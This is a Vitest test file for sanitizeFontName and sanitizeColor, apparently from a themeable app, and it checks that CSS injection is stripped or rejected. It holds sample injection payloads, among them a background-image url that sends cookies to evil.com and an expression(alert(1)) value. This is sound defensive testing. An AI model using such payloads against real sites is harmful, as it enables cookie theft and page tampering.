import { describe, it, expect } from "vitest";
import { sanitizeFontName, sanitizeColor } from "./themes";

describe("sanitizeFontName", () => {
  it("passes through normal font names", () => {
    expect(sanitizeFontName("Cascadia Code")).toBe("Cascadia Code");
    expect(sanitizeFontName("JetBrains Mono")).toBe("JetBrains Mono");
    expect(sanitizeFontName("Fira Code")).toBe("Fira Code");
  });

  it("allows hyphens and dots", () => {
    expect(sanitizeFontName("Noto-Sans")).toBe("Noto-Sans");
    expect(sanitizeFontName("Font.Name")).toBe("Font.Name");
  });

  it("strips quotes that could break CSS interpolation", () => {
    expect(sanitizeFontName('Consolas"')).toBe("Consolas");
    expect(sanitizeFontName("Consolas'")).toBe("Consolas");
  });

  it("strips semicolons that could inject CSS", () => {
    expect(sanitizeFontName("Consolas; } body { color: red")).toBe("Consolas  body  color red");
  });

  it("strips parentheses that could call url()", () => {
    expect(sanitizeFontName("font); url(evil.com")).toBe("font urlevil.com");
  });

  it("strips backslashes", () => {
    expect(sanitizeFontName("font\\name")).toBe("fontname");
  });

  it("handles empty string", () => {
    expect(sanitizeFontName("")).toBe("");
  });

  it("strips full CSS injection payload", () => {
    const payload = 'Consolas", "Consolas", monospace; } * { background-image: url("https://evil.com/exfil?cookie=';
    const result = sanitizeFontName(payload);
    expect(result).not.toContain(";");
    expect(result).not.toContain("(");
    expect(result).not.toContain('"');
    expect(result).not.toContain("'");
  });
});

describe("sanitizeColor", () => {
  it("allows hex colors", () => {
    expect(sanitizeColor("#fff")).toBe("#fff");
    expect(sanitizeColor("#1e1e2e")).toBe("#1e1e2e");
    expect(sanitizeColor("#1e1e2eFF")).toBe("#1e1e2eFF");
  });

  it("allows rgb/rgba/hsl/hsla", () => {
    expect(sanitizeColor("rgb(30, 30, 46)")).toBe("rgb(30, 30, 46)");
    expect(sanitizeColor("rgba(30, 30, 46, 0.5)")).toBe("rgba(30, 30, 46, 0.5)");
    expect(sanitizeColor("hsl(240, 21%, 15%)")).toBe("hsl(240, 21%, 15%)");
  });

  it("allows color-mix", () => {
    expect(sanitizeColor("color-mix(in srgb, var(--surface) 30%, transparent)"))
      .toBe("color-mix(in srgb, var(--surface) 30%, transparent)");
  });

  it("allows CSS var()", () => {
    expect(sanitizeColor("var(--accent)")).toBe("var(--accent)");
  });

  it("rejects CSS injection payloads", () => {
    expect(sanitizeColor("#000; } * { background: url(evil)")).toBe("#000000");
    expect(sanitizeColor("expression(alert(1))")).toBe("#000000");
    expect(sanitizeColor("url(https://evil.com)")).toBe("#000000");
  });

  it("rejects empty/garbage values", () => {
    expect(sanitizeColor("")).toBe("#000000");
    expect(sanitizeColor("notacolor")).toBe("#000000");
  });
});
